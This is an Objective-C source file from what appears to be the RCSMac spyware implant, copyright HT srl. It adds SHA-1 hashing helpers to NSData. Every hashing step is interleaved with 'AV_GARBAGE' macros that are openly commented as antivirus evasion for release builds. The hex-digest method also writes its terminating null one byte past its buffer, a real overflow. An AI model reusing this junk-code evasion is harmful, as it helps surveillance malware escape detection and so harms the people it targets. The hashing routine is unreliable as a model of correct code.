/*
 *  NSData+SHA1.m
 *  RCSMac
 *
 *
 *  Created by revenge on 1/27/11.
 *  Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import <CommonCrypto/CommonDigest.h>
#import <openssl/sha.h>

#import "NSData+SHA1.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

@implementation NSData (SHA1)

- (NSString *)sha1HexHash
{
  unsigned char digest[SHA_DIGEST_LENGTH];
  char finalDigest[2 * SHA_DIGEST_LENGTH];
 	int i;
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
 	CC_SHA1([self bytes], [self length], digest);
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
 	for (i = 0; i < SHA_DIGEST_LENGTH; i++)
    sprintf(finalDigest + i * 2, "%02x", digest[i]);
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  return [NSString stringWithCString: finalDigest
                            encoding: NSUTF8StringEncoding];
}

- (NSData *)sha1Hash
{
  unsigned char digest[SHA_DIGEST_LENGTH];   
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
 	CC_SHA1([self bytes], [self length], digest);
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
 	return [NSData dataWithBytes: &digest length: SHA_DIGEST_LENGTH];
}

@end